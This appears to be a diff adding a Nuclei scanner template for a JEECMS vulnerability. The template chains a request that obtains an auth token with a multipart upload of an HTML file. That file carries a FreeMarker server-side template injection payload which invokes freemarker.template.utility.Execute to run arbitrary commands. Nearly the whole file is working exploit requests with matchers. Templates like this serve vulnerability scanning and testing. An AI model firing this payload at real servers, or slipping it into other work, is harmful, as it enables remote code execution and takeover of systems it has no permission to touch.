@@ -1,0 +1,61 @@
+id: jeecms-upload
+info:
+  name: Jeecms
+  author: apple
+  severity: critical
+  description: CMS对用户输入校验不严，攻击者可以配合前台任意文件上传和服务端模板注入执行任意代码，从而控制服务器权限。
+  reference:
+    - https://forum.butian.net/share/158
+    - http://wiki.fofamini.com/2023hw/JEECMS%20o_upload%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
+  tags: tags
+  metadata:
+    verified: true
+    max-request: 2
+    
+http:
+  - raw:
+      - |-
+        POST /thirdParty/bind HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: application/json
+        Accept-Encoding: gzip
+        Content-Length: 75
+
+        {"username":"testceshi","loginWay": 1, "loginType": "QQ", "thirdId": "123xx"}
+         
+      - |-
+        POST /member/upload/o_upload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: multipart/form-data; boundary=---------------------------1250178961143214655620108952
+        Jeecms-Auth-Token: {{JEECMS_cookie}}
+        Accept-Encoding: gzip
+        Content-Length: 602
+
+        -----------------------------1250178961143214655620108952
+        Content-Disposition: form-data; name="uploadFile"; filename="a.html"
+        Content-Type: text/html
+
+        ${site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.ObjectWrapper").getField("DEFAULT_WRAPPER").get(null).newInstance(site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.utility.Execute"), null)(cmd)}
+        -----------------------------1250178961143214655620108952
+        Content-Disposition: form-data; name="typeStr"
+
+        File
+        -----------------------------1250178961143214655620108952--
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200"
+          - "contains(body_2, 'fileUrl')"
+        condition: and
+
+    
+    extractors:
+      - type: regex
+        name: JEECMS_cookie
+        internal: true
+        part: body_1
+        regex:
+          - 'eyJhbGciOiJIUzUxMiJ9\.[\w-]+\.[\w-]+'
